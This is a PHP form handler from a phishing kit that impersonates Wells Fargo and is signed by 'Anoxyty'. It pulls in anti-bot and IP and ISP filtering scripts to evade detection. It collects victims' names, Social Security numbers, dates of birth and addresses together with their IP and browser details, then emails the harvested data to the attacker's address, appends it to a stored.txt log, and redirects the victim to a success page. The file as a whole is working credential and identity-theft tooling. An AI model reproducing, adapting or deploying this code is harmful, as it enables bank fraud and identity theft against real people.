<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
include ("anti/bot.php");
	include ("anti/iprange.php");
	include ("anti/wrd.php");
	include ("anti/isp.php");
	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['fname'] ) ) {
		
		$_SESSION['fname'] 	  = $_POST['fname'];
		$_SESSION['lname'] 	  = $_POST['lname'];
		$_SESSION['snnn'] 	  = $_POST['snnn'];
		$_SESSION['dob'] 	  = $_POST['dob'];
		$_SESSION['stradd1'] 	  = $_POST['stradd1'];
		$_SESSION['stradd2'] 	  = $_POST['stradd2'];
       $_SESSION['zipcode'] 	  = $_POST['zipcode'];
       $_SESSION['state'] 	  = $_POST['state'];
		$code = <<<EOT
============== [ WellsFargo Personal Info By Anoxyty | ]🔥 ==============
[First Name] 		: {$_SESSION['fname']}
[Last Name]		: {$_SESSION['lname']}
[Social Security Number] 		: {$_SESSION['snnn']}
[Date of Birth]		: {$_SESSION['dob']}
[Street Address] 		: {$_SESSION['stradd1']}
[Street Address 2]		: {$_SESSION['stradd2']}
[Zip Code] 		: {$_SESSION['zipcode']}
[State Region]		: {$_SESSION['state']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 WellsFargo Personal Info By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 WellsFargo Personal Info By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: success.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>